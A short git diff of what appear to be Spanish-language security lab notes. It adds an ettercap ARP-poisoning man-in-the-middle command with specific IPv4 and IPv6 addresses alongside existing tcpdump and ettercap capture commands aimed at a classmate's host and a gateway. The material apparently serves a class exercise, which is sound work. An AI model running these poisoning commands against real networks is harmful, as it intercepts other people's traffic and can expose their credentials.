@@ -141,6 +141,7 @@ tcpdump -w apartado_e -i ens33
 ettercap -Tq -M arp:remote -P remote_browser /IP Alex// /10.11.48.1// -w /home/lsi/Descargas/apartado_f
 ```
 
+
 - Desde el wireshark:
 
 Statistics > HTTP > Requests:
@@ -159,6 +160,10 @@ Creamos antes el archivo en /var/log/MITMIPv6
 
 ```
 ettercap -i ens33 -P repoison_arp -T -M arp:remote /Ip_Alex/Ipv6_Alex/ /10.11.48.1// -w /var/log/MITMIPv6
+```
+```
+ ettercap -i ens33 -P repoison_arp -T -M arp:remote /10.11.48.203/2002:a0b:30cb::1/ /10.11.48.1// -w /var/log/MITMIPv6
+
 ```
 **- VICTIMA:**
 
